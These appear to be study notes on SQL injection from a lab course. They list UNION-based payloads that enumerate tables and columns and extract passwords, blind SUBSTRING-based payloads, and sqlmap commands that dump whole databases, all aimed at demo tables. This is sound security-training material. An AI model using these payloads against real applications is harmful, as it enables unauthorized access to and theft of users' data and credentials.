# SQL injection

### SQL Injection - Introduction

```
# start the mysql service
sudo systemctl start mysql

# login to mysql
sudo mysql

# create the db and tables
CREATE DATABASE sqldemo;
use sqldemo;
CREATE TABLE users (
	username varchar(255),
	password varchar(255),
	age int,
	PRIMARY KEY (username)
);

# insert data into the users table
INSERT INTO users (username,password,age)
VALUES ("jessamy","kittems",31);
```

### SQL injection - UNION

try and force SQL errors with `'` or `"`

Find injection with ojectively true statements `' or 1=1#`

Use union to pull data from tables and columns that aren't part of the SQL query

Union select can only select the same number of columns as the original query

Determine how many columns are being used with `null`:

`jeremy' union select null#`
`jeremy' union select null,null#`
`jeremy' union select null,null,null#`

Query the DB version with a union select:

`jeremy' union select null,null,version()#`

Table names:

`jeremy' union select null,null,table_name from information_schema.tables#`

Column names:

`jeremy' union select null,null,column_name from information_schema.columns#`

Exfiltrate passwords:

`jeremy' union select null,null,password from injection0x01#`

Null's may not work as the type won't match with the column (null is a string)

Use `null(int)` or basic integers instead:

`jeremy' union select null(int),1,password from injection0x01#`

[Portswigger SQLi cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

### SQL injection - Blind

Check Content length headers for a successful request vs a failure as indicators for blind SQLi

Use burp suite repeater to test parameters. Check headers for injectable parameters (Cookies, User-Agent, 
etc.)

The search bar in Repeater will display matches to a keyword when the requests complete

Save a request from Burp by copy pasting into a text file, then run sqlmap with the request

`sqlmap -r req.txt`

Blind SQLi can only be used to obtain true or false responses

[Checking string values with SUBSTRING()](https://www.w3schools.com/sql/func_sqlserver_substring.asp) allows us to enumerate usernames, passwords, DB version, etc.

Blind SQL payloads:

Check version

`' and 1=1 and substring((select version()), 1, 1) = '8'#`
`' and 1=1 and substring((select version()), 1, 2) = '8.'#`
`' and 1=1 and substring((select version()), 1, 3) = '8.0'#`
`' and 1=1 and substring((select version()), 1, 5) = '8.0.3'#`

Password of a known user

`' and 1=1 and substring((select password from tablename where username = 'username'), 1, 1) = 'a'#`

Use sqlmap to test Cookies with `--level=2`

`sqlmap -r req.txt --level=2`

Dump the DB

`sqlmap -r req.txt --level=2 --dump`

Only dump a specific table

`sqlmap -r req.txt --level=2 --dump -T injection0x02`

### SQL injection Challenge

Find number of columns:

`' union select null,null,null,null#`

Find table names:

`' union select null,null,null,table_name from information_schema.tables#`

Find column names:

`' union select null,null,null,column_name from information_schema.columns where table_name = 'injection0x03_users'#`

Find usernames:

`' union select null,null,null,username from injection0x03_users#`
